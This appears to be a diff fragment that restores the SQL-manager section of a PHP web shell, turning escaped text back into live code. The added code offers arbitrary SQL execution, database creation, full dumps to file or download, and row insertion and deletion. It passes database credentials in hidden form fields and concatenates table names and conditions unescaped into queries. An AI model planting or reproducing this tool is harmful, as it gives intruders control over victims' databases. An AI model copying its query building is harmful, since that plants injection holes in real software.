-    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
+    echo "<hr size=\"1\" noshade>";
+    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
     if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
-    if ((!$submit) or ($sql_act)) {echo "&lt;table border=\"0\" width=\"100%\" height=\"1\"&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\"".$sql_surl."\" method=\"POST\"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\"sql_query\" cols=\"100\" rows=\"10\"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"query\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"submit\" value=\"1\"&gt;&lt;input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"&gt;&nbsp;&lt;input type=\"submit\" value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";}
+    if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td></tr></table>";}
    }
    if (in_array($sql_act,$acts))
    {
-    ?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newtbl"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newtbl" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="dump"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"&gt;&nbsp;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php
-    if (!empty($sql_act)) {echo "&lt;hr size=\"1\" noshade&gt;";}
+    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
+    if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
     if ($sql_act == "newtbl")
     {
-     echo "&lt;b&gt;";
-     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";
+     echo "<b>";
+     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
     }
-    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
+    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    elseif ($sql_act == "dump")
    {
     if (empty($submit))
     {
      $diplay = FALSE;
-     echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"dump\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;b&gt;SQL-Dump:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
-     echo "&lt;b&gt;DB:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"&gt;&lt;br&gt;&lt;br&gt;";
+     echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
+     echo "<b>DB:</b>&nbsp;<input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
      $v = join (";",$dmptbls);
-     echo "&lt;b&gt;Only tables (explode \";\")&nbsp;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt;:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"&gt;&lt;br&gt;&lt;br&gt;";
+     echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
      if ($dump_file) {$tmp = $dump_file;}
      else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
-     echo "&lt;b&gt;File:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"&gt;&lt;br&gt;&lt;br&gt;";
-     echo "&lt;b&gt;Download: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;";
-     echo "&lt;b&gt;Save to file: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked&gt;";
-     echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Dump\"&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt; - all, if empty";
-     echo "&lt;/form&gt;";
+     echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
+     echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
+     echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
+     echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
+     echo "</form>";
     }
     else
     {
@@ -1447,15 +1447,15 @@ else
      elseif ($sql_dump_savetofile)
      {
       $fp = fopen($sql_dump_file,"w");
-      if (!$fp) {echo "&lt;b&gt;Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
+      if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
       else
       {
        fwrite($fp,$ret);
        fclose($fp);
-       echo "&lt;b&gt;Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")&lt;/b&gt;.";
+       echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
       }
      }
-     else {echo "&lt;b&gt;Dump: nothing to do!&lt;/b&gt;";}
+     else {echo "<b>Dump: nothing to do!</b>";}
     }
    }
    if ($diplay)
@@ -1469,7 +1469,7 @@ else
      $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
      $tbl_struct_fields = array();
      while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
-     if ($sql_ls &gt; $sql_le) {$sql_le = $sql_ls + $perpage;}
+     if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
      if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
      if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
      if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
@@ -1486,12 +1486,12 @@ else
      else {$v = "";}
      $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
      $result = mysql_query($query) or print(mysql_smarterror());
-     echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)&lt;/b&gt;&lt;/center&gt;";
-     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\"&gt;[&nbsp;&lt;b&gt;Structure&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
-     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\"&gt;[&nbsp;&lt;b&gt;Browse&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
-     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\"&gt;[&nbsp;&lt;b&gt;Dump&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
-     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\"&gt;[&nbsp;&lt;b&gt;Insert&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
-     if ($sql_tbl_act == "structure") {echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Coming sooon!&lt;/b&gt;";}
+     echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
+     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
+     if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
      if ($sql_tbl_act == "insert")
      {
       if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
@@ -1500,91 +1500,91 @@ else
       }
       else
       {
-       echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Inserting row into table:&lt;/b&gt;&lt;br&gt;";
+       echo "<br><br><b>Inserting row into table:</b><br>";
        if (!empty($sql_tbl_insert_q))
        {
         $sql_query = "SELECT * FROM `".$sql_tbl."`";
         $sql_query .= " WHERE".$sql_tbl_insert_q;
         $sql_query .= " LIMIT 1;";
-        $result = mysql_query($sql_query,$sql_sock) or print("&lt;br&gt;&lt;br&gt;".mysql_smarterror());
+        $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
         $values = mysql_fetch_assoc($result);
         mysql_free_result($result);
        }
        else {$values = array();}
-       echo "&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Field&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Function&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
+       echo "<form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
        foreach ($tbl_struct_fields as $field)
        {
         $name = $field["Field"];
         if (empty($sql_tbl_insert_q)) {$v = "";}
-        echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;".htmlspecialchars($name)."&lt;/b&gt;&lt;/td&gt;&lt;td&gt;".$field["Type"]."&lt;/td&gt;&lt;td&gt;&lt;select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"&gt;&lt;option value=\"\"&gt;&lt;/option&gt;&lt;option&gt;PASSWORD&lt;/option&gt;&lt;option&gt;MD5&lt;/option&gt;&lt;option&gt;ENCRYPT&lt;/option&gt;&lt;option&gt;ASCII&lt;/option&gt;&lt;option&gt;CHAR&lt;/option&gt;&lt;option&gt;RAND&lt;/option&gt;&lt;option&gt;LAST_INSERT_ID&lt;/option&gt;&lt;option&gt;COUNT&lt;/option&gt;&lt;option&gt;AVG&lt;/option&gt;&lt;option&gt;SUM&lt;/option&gt;&lt;option value=\"\"&gt;--------&lt;/option&gt;&lt;option&gt;SOUNDEX&lt;/option&gt;&lt;option&gt;LCASE&lt;/option&gt;&lt;option&gt;UCASE&lt;/option&gt;&lt;option&gt;NOW&lt;/option&gt;&lt;option&gt;CURDATE&lt;/option&gt;&lt;option&gt;CURTIME&lt;/option&gt;&lt;option&gt;FROM_DAYS&lt;/option&gt;&lt;option&gt;FROM_UNIXTIME&lt;/option&gt;&lt;option&gt;PERIOD_ADD&lt;/option&gt;&lt;option&gt;PERIOD_DIFF&lt;/option&gt;&lt;option&gt;TO_DAYS&lt;/option&gt;&lt;option&gt;UNIX_TIMESTAMP&lt;/option&gt;&lt;option&gt;USER&lt;/option&gt;&lt;option&gt;WEEKDAY&lt;/option&gt;&lt;option&gt;CONCAT&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50&gt;&lt;/td&gt;&lt;/tr&gt;";
+        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
         $i++;
        }
-       echo "&lt;/table&gt;&lt;br&gt;";
-       echo "&lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "&gt;&lt;b&gt;Insert as new row&lt;/b&gt;";
-       if (!empty($sql_tbl_insert_q)) {echo " or &lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked&gt;&lt;b&gt;Save&lt;/b&gt;"; echo "&lt;input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\"&gt;";}
-       echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;";
+       echo "</table><br>";
+       echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
+       if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
+       echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
       }
      }
      if ($sql_tbl_act == "browse")
      {
       $sql_tbl_ls = abs($sql_tbl_ls);
       $sql_tbl_le = abs($sql_tbl_le);
-      echo "&lt;hr size=\"1\" noshade&gt;";
-      echo "&lt;img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\"&gt;&nbsp;";
+      echo "<hr size=\"1\" noshade>";
+      echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
       $b = 0;
-      for($i=0;$i&lt;$numpages;$i++)
+      for($i=0;$i<$numpages;$i++)
       {
-       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"&gt;&lt;u&gt;";}
+       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
        echo $i;
-       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;/u&gt;&lt;/a&gt;";}
-       if (($i/30 == round($i/30)) and ($i &gt; 0)) {echo "&lt;br&gt;";}
+       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
+       if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
        else {echo "&nbsp;";}
       }
       if ($i == 0) {echo "empty";}
-      echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"&gt;&nbsp;&lt;input type=\"submit\" value=\"View\"&gt;&lt;/form&gt;";
-      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;";
-      echo "&lt;tr&gt;";
-      echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"&gt;&lt;/td&gt;";
-      for ($i=0;$i&lt;mysql_num_fields($result);$i++)
+      echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>";
+      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>";
+      echo "<tr>";
+      echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
+      for ($i=0;$i<mysql_num_fields($result);$i++)
       {
        $v = mysql_field_name($result,$i);
        if ($e[0] == "a") {$s = "d"; $m = "asc";}
        else {$s = "a"; $m = "desc";}
-       echo "&lt;td&gt;";
+       echo "<td>";
        if (empty($e[0])) {$e[0] = "a";}
-       if ($e[1] != $v) {echo "&lt;a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"&gt;&lt;b&gt;".$v."&lt;/b&gt;&lt;/a&gt;";}
-       else {echo "&lt;b&gt;".$v."&lt;/b&gt;&lt;a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"&gt;&lt;img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"&gt;&lt;/a&gt;";}
-       echo "&lt;/td&gt;";
+       if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
+       else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
+       echo "</td>";
       }
-      echo "&lt;td&gt;&lt;font color=\"green\"&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;";
-      echo "&lt;/tr&gt;";
+      echo "<td><font color=\"green\"><b>Action</b></font></td>";
+      echo "</tr>";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
       {
-       echo "&lt;tr&gt;";
+       echo "<tr>";
        $w = "";
        $i = 0;
-       foreach ($row as $k=&gt;$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
-       if (count($row) &gt; 0) {$w = substr($w,0,strlen($w)-3);}
-       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"&gt;&lt;/td&gt;";
+       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
+       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
+       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
        $i = 0;
-       foreach ($row as $k=&gt;$v)
+       foreach ($row as $k=>$v)
        {
         $v = htmlspecialchars($v);
-        if ($v == "") {$v = "&lt;font color=\"green\"&gt;NULL&lt;/font&gt;";}
-        echo "&lt;td&gt;".$v."&lt;/td&gt;";
+        if ($v == "") {$v = "<font color=\"green\">NULL</font>";}
+        echo "<td>".$v."</td>";
         $i++;
        }
-       echo "&lt;td&gt;";
-       echo "&lt;a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;";
